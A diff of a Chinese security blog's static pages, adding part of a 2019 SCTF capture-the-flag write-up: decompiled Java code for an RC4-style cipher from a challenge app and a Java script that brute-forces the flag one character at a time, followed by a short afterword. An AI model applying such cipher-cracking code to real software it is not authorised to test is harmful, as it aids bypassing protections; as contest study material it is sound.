class="title">c</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> m = <span class="number">256</span>;</div><div class="line">  </div><div class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">a</span><span class="params">(String paramString1, String paramString2)</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">int</span> i = m;</div><div class="line">    <span class="keyword">int</span>[] arrayOfInt = <span class="keyword">new</span> <span class="keyword">int</span>[i];</div><div class="line">    <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[i];</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++)</div><div class="line">    &#123;</div><div class="line">      arrayOfInt[i] = i;</div><div class="line">      arrayOfByte[i] = ((<span class="keyword">byte</span>)(<span class="keyword">byte</span>)paramString2.charAt(i % paramString2.length()));</div><div class="line">    &#125;</div><div class="line">    i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (;;)</div><div class="line">    &#123;</div><div class="line">      k = m;</div><div class="line">      <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) &#123;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      &#125;</div><div class="line">      j = (arrayOfInt[i] + j + arrayOfByte[i]) % k;</div><div class="line">      k = arrayOfInt[i];</div><div class="line">      arrayOfInt[i] = arrayOfInt[j];</div><div class="line">      arrayOfInt[j] = k;</div><div class="line">      i++;</div><div class="line">    &#125;</div><div class="line">    paramString2 = paramString1.toCharArray();</div><div class="line">    paramString1 = <span class="keyword">new</span> <span class="keyword">char</span>[paramString1.length()];</div><div class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</div><div class="line">    j = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; paramString2.length; i++)</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">int</span> n = m;</div><div class="line">      k = (k + <span class="number">1</span>) % n;</div><div class="line">      j = (arrayOfInt[k] + j) % n;</div><div class="line">      <span class="keyword">int</span> i1 = arrayOfInt[k];</div><div class="line">      arrayOfInt[k] = arrayOfInt[j];</div><div class="line">      arrayOfInt[j] = i1;</div><div class="line">      <span class="keyword">int</span> i2 = arrayOfInt[k];</div><div class="line">      i1 = arrayOfInt[k];</div><div class="line">      paramString1[i] = ((<span class="keyword">char</span>)(<span class="keyword">char</span>)(paramString2[i] - k ^ (<span class="keyword">char</span>)arrayOfInt[((i2 + i1 % n) % n)]));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">new</span> p();</div><div class="line">    <span class="keyword">return</span> p.a(<span class="keyword">new</span> String(paramString1).getBytes());</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>分析加密类之后可以知道每个字符进去后输出的密文都是一个固定的字符串<br>于是直接爆破每一位<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.lang.String;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">       c a = <span class="keyword">new</span> c();</div><div class="line">       String flag = <span class="string">"sctf&#123;"</span>;</div><div class="line">       String printable = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-.:;&lt;=&gt;?@[]^_&#123;|&#125;~"</span>;</div><div class="line">       String ss = <span class="string">"C28BC39DC3A6C283C2B3C39DC293C289C2B8C3BAC29EC3A0C3A7C29A1654C3AF28C3A1C2B1215B53"</span>;</div><div class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">100</span>;j++)</div><div class="line">       &#123;</div><div class="line">           <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;printable.length();i++)</div><div class="line">           &#123;</div><div class="line">               String now=  flag + printable.charAt(i);</div><div class="line">               <span class="comment">//System.out.println(now);</span></div><div class="line">               String d = a.a(now,<span class="string">"E7E64BF658BAB14A25C9D67A054CEBE5"</span>);</div><div class="line">               <span class="keyword">if</span>(ss.indexOf(d) == <span class="number">0</span>)</div><div class="line">               &#123;</div><div class="line">                   System.out.println(<span class="string">"flag: "</span> + now);</div><div class="line">                   flag = now;</div><div class="line">               &#125;</div><div class="line">           &#125;</div><div class="line">           <span class="comment">//break;</span></div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/img/2019-sctf-7.png" alt=""></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>好久没有这么肝一场比赛了，最后我们队因为123血太少只拿了第三，稍微有些遗憾，但还是感谢队友，感谢出题和运维师傅们递茶，给师傅们递茶！</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/weixin.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">mysql字符截断</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">php</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">RCE</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">命令执行</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">源码泄露</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">WriteUp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/07/26/2017-xman-audition-web-writeup/" class="archive-article-date">
-  	<time datetime="2017-07-26T03:10:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/07/26/2017-xman-audition-web-writeup/">2017 XMAN选拔赛WEB部分 WriteUp</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">php</a>
-        		</li>
-      		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">WriteUp</a>
         		</li>
@@ -252,93 +293,128 @@
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
         		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件包含</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">上传</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SQL注入</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">反序列化</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">盲注</a>
-        		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode" id="wx-qrcode">
+      
+      <script type="text/javascript" src="/qrcode.js"></script>
+      <script>
+      var qrcode = new QRCode(document.getElementById("wx-qrcode"), {});
+      qrcode.makeCode("https://www.codemonster.cn/2019/06/24/2019-sctf-writeup/");
+      </script>
+      
+    </div>
+</div>
+
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/07/13/burpSuite-add-sqlmap/" class="archive-article-date">
-  	<time datetime="2017-07-13T02:44:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-13</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/01/24/java-serialize-vuln0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">JAVA反序列化漏洞系列之—基础知识</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/07/13/burpSuite-add-sqlmap/">渗透神器合体：在BurpSuite中集成Sqlmap</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">burpsuite</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sqlmap</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">插件</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#math-is-fun1"><span class="toc-number">1.</span> <span class="toc-text">math-is-fun1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#math-is-fun2"><span class="toc-number">2.</span> <span class="toc-text">math-is-fun2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag-shop"><span class="toc-number">3.</span> <span class="toc-text">flag shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Maaaaaaze"><span class="toc-number">4.</span> <span class="toc-text">Maaaaaaze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#music"><span class="toc-number">5.</span> <span class="toc-text">music</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">6.</span> <span class="toc-text">后记</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
   
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -380,8 +456,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
